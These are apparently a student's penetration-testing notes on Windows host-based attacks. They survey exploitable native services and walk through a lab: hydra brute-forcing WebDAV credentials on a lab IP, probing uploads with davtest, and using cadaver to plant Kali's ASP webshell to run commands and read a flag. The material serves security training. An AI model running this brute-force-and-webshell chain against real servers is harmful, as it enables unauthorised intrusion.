
## System/Host-based attacks
#Systemattacks #hostbasedattacks

- Looking at exploiting the system itself (Windows/Linux)
- Usually done after a network exploit (after gaining access to the network)
- Attacks are focused on exploiting inherent vulns in misconfigured OS 
- Useful when attacking a host (eg some random employee latop connected to the server which you prev accessed using a network attack)
- The host might not be running anyt except SMB (or other stuff natively built into windows ) to file share with the server, so understanding of windows is necessary
- impt for exploits where hosts do not have typical public-facing services running (HTTP/HTTPS etc)

Outline:
- Windows/Linux
	- Overview of vulns
	- Exploit these vulns
	- Priveledge escalation 
		- kernal exploitation/impersonation
	- File system vulns
	- Credential dumping
	- Lateral movement 
		- Use of credentials found to move between targets

# Windows
### Overview:
Common vulns
MS08-067(Conflicker) to MS17-010 (Eternal Blue)

Lots of legacy versions exist, fragmented nature of companies with diff unpatched vers leaves vuln

Built on C so vulnerable to common exploits:
- buffer overflow
- arbitrary code exec etc
Default install is not built to be secure (even in windows 10 etc)
Endpt protection has to be handled by the company (antivirus/firewall settings etc)

Common exploited services native to windows:
| Protocol/Service                                  | Default Ports        | Purpose                                                                         |
| ------------------------------------------------- | ------------ | ------------------------------------------------------------------------------- |
| Microsoft IIS (internet Information system)       | TCP 80/443   | Proprietary server software that runs on windows                                |
| WebDAV (web distributed authoring and versioning) | TCP 80/443   | HTTP extenstion allows web server to act as a file server                       |
| SMB/CIFS                                          | TCP 445      | Network file sharing and peripherals between computers on a LAN (eg Printers)                 |
| RDP                                               | TCP 3389     | Proprietary GUI used to remotely authenticate and interact with windows systems |
| WinRM (Remote management)                         | TCP 5986/443 | Remote management protocol for remote access to windows systems                 |
|                                                   |              |                                                                                 |


### Exploit WevDAV running on Microsoft IIS
- IIS is a windows webserver. Functions like any web server (eg Apache or Nginx)
- Can be used for static/dynamis webpages
- developed in asp.net and PHP (can be set up to host asp or php web applicaiton)

- WebDav allows web server to function as a file server (like FTP) to allow collaborative editing etc
- Without SSL cert it runs on port 80 else with SSL it runs on 443 (ie http vs https)
- After bruteforcing auth, malicious ASP payload can be uploaded and executed  to create a reverse shell
Tools:
davtest - USed to scan auth and expl webDAV erver
cadaver - file upload/dl on-screen disp etc etc

Lab:
nmap script http-enum to scan the server
hydra to brute force auth in the /webdav/ directory found
```bash
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
```
Davtest to see wat types of files can be uploaded
```bash
davtest -auth bob:password_123321 -url http://10.2.17.124/webdav
```
From the test prev, Txt,Asp and http files can be executed
So
Cadaver used to upload Rev shell
```bash
cadaver http://10.2.123.123/webdav
#enter username and password
#enumerate like a normal ftp server
```
Kali comes with some webshells found at:
ls -al /usr/share/webshells/

- Upload the asp shell found into the webdav server
```cadaver
put /usr/share/webshells/asp/webshell.asp
```
Viewing the directory on the browser the webshell should be there for u to open.
Can run code in the box to execute commands on the target system
type c:\\flag.txt

